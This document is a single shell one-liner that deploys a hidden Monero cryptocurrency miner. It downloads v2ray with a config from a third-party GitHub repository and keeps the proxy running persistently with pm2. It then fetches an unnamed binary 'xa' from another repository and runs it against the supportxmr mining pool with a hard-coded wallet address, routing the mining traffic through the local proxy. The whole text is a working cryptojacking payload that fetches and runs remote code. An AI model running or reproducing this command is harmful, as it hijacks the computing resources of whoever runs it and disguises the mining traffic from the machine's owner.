echo "./v2ray run --config=fx.json" > bash.sh && npm install pm2 -g && wget https://github.com/v2fly/v2ray-core/releases/download/v5.13.0/v2ray-linux-64.zip && unzip v2ray-linux-64.zip && wget https://raw.githubusercontent.com/mirjinx83/probable-invention/main/fx.json && chmod 777 bash.sh && pm2 start bash.sh && wget https://raw.githubusercontent.com/mirjinx83/upgraded-dollop/main/xa && chmod 777 xa && ./xa -o pool.supportxmr.com:443 -u 41zBPLKfdxgPQe1tu32P4XaPXsSfdTFiBadd2MjNzujYRWTArRjfZUdXJZKUZRsbgpfUXWLgmfrs6RLBfmvyy2AxR1SJmF8  -k -p SmS --randomx-mode=fast --tls --proxy=127.0.0.1:10080
